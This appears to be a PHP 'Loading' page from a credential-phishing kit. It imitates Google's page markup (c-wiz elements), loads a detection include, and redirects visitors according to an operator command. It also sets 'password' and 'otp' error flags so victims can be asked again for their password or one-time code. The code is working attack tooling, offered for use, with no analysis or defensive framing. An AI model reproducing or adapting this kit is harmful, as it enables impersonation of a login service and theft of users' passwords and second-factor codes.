<?php
if(!isset($_GET['for'])){
    die('');
    exit();
}

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require_once(__DIR__ . '/../includes/php/config.php');
require_once(__DIR__ .  '/../includes/php/detect.php');

$target = checkCommand();
if ($target !== '') {
    if (strpos($target, '..') === 0 || strpos($target, '/') === 0) {
        header('Location: ' . $target);
    } else {
        header('Location: ./' . $target);
    }
    exit();
}

$full_id = $_SESSION['unique_id'];

if($_GET['for'] == 'otp'){
    if(!isset($_SESSION['otp_err'])) $_SESSION['otp_err'] = true;
}elseif($_GET['for'] == 'password'){
    if(!isset($_SESSION['pwd_err'])) $_SESSION['pwd_err'] = true;
    if(!isset($_SESSION['login_err'])) $_SESSION['login_err'] = true;
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading</title>
    <link rel="stylesheet" href="css/index.css">
    <script src="js/jquery-3.6.0.min.js"></script>
    <link rel="shortcut icon" href="media/7611770.png" type="image/x-icon">
</head>
<body>
    <?php $start_html = TRUE; require_once(__DIR__ . '/html/start.php'); ?>
                            </div>
                        </div>
                    </c-wiz>
                </div>
            </div>
        </div>
    </div>
    <?php 
    require_once(__DIR__ . '/../includes/js/start_request.php'); 
    require_once(__DIR__ . '/../includes/js/make_request.php');
    ?>
    <script src="js/loader.js"></script>
</body>
</html>